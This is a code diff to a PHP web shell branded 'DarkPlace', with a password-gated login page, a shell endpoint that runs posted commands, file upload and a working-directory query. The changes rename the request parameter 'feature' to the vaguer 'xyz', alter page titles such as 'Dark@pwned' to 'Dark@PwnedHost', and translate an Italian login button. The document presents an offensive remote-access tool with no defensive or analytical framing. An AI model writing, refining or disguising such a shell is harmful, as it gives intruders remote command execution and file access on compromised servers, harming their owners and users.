@@ -15,7 +15,7 @@ if (!isset($_SESSION['authenticated'])) {
     <html>
     <head>
         <meta charset="UTF-8" />
-        <title>Login - DarkPlace</title>
+        <title>Login @ DarkPlace</title>
         <style>
             body {
                 font-family: monospace;
@@ -40,11 +40,10 @@ if (!isset($_SESSION['authenticated'])) {
         </style>
     </head>
     <body>
-        <h1>Password</h1>
         <?php if (isset($error)) { echo "<p style='color:red;'>$error</p>"; } ?>
         <form method="POST">
             <input type="password" name="password" placeholder="Password" required />
-            <input type="submit" value="Accedi" />
+            <input type="submit" value="Login" />
         </form>
     </body>
     </html>
@@ -53,7 +52,7 @@ if (!isset($_SESSION['authenticated'])) {
 }
 $SHELL_CONFIG = array(
     'username' => 'Dark',
-    'hostname' => 'pwned',
+    'hostname' => 'Pwned',
 );
 
 function expandPath($path) {
@@ -207,11 +206,11 @@ function initShellConfig() {
     }
 }
 
-if (isset($_GET["feature"])) {
+if (isset($_GET["xyz"])) {
 
     $response = NULL;
 
-    switch ($_GET["feature"]) {
+    switch ($_GET["xyz"]) {
         case "shell":
             $cmd = $_POST['cmd'];
             if (!preg_match('/2>/', $cmd)) {
@@ -242,7 +241,7 @@ if (isset($_GET["feature"])) {
 
     <head>
         <meta charset="UTF-8" />
-        <title>Dark@pwned:~#</title>
+        <title>Dark@PwnedHost:~#</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -418,7 +417,7 @@ if (isset($_GET["feature"])) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
                 } else {
-                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                    makeRequest("?xyz=shell", {cmd: command, cwd: CWD}, function (response) {
                         if (response.hasOwnProperty('file')) {
                             featureDownload(atob(response.name), response.file)
                         } else {
@@ -485,7 +484,7 @@ if (isset($_GET["feature"])) {
                 element.addEventListener('change', function () {
                     var promise = getBase64(element.files[0]);
                     promise.then(function (file) {
-                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
+                        makeRequest('?xyz=upload', {path: path, file: file, cwd: CWD}, function (response) {
                             _insertStdout(atob(response.stdout));
                             updateCwd(atob(response.cwd));
                         });
@@ -522,7 +521,7 @@ if (isset($_GET["feature"])) {
                     _updatePrompt();
                     return;
                 }
-                makeRequest("?feature=pwd", {}, function(response) {
+                makeRequest("?xyz=pwd", {}, function(response) {
                     CWD = atob(response.cwd);
                     _updatePrompt();
                 });
